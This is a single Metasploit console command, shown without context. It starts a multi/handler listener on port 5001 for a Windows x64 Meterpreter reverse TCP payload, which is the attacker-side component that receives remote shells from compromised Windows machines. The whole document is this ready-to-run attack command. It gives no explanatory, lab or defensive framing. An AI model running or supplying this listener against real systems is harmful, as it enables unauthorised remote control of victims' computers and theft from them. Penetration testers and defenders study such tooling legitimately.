msfconsole -q -x "use exploit/multi/handler; \
set payload windows/x64/meterpreter/reverse_tcp; \
set lhost 0.0.0.0; \
set lport 5001; \
exploit;"

